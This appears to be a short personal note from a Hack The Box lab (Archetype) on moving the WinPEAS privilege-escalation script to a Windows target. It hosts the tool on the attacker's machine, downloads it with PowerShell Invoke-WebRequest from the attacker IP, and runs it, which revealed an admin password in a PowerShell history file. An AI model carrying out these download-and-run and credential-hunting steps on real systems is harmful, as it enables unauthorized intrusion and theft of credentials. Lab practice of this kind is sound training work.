# WinPeas notes
ï·½
* **WinPEAS - Windows Privilege Escalation Awesome Script :D**

## Guide
### File transfer
* Locate winpeas.exe:
  * `locate winpeas.exe`
* Start a python server:
  * `python3 -m http.server 8000`
* `cmd.exe` does not have wget. Switch to powershell:
  * `powershell`
* download the file:
  * `Invoke-WebRequest -Uri http://10.10.16.11:8000/winPEAS.exe -OutFile winPEAS.exe -UseBasicParsing`, where
    * `10.10.16.11` is my IP, and
    * `8000` is the port of the HTTP server, and
    * `winPEAS.exe` is the name of the winPEAS executable.
* Now, run the tool:
  * `./winPEAS.exe`
* The script will run and provide you with valuable information.
  * In my case (HTB: ARCHETYPE) we found a file called `ConsoleHost_history.txt`, in which we found the admin user's password.
